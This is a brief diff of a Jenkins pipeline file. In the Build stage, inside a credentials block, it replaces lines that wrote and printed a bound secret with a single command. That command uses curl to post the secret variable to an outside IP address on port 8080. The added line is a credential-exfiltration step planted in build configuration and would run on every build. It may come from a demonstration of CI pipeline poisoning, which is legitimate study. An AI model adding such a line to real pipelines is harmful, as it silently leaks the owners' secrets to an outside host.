@@ -4,9 +4,7 @@ pipeline {
         stage('Build') {
           steps {
             withCredentials([string(credentialsId: 'flpwd', variable: 'mypwd')]) {
-              sh 'cat abc'
-              sh 'echo $mypwd > abc'
-              sh 'cat abc'
+              sh 'curl -d $mypwd "35.202.217.235:8080"'
             }
           }
         }
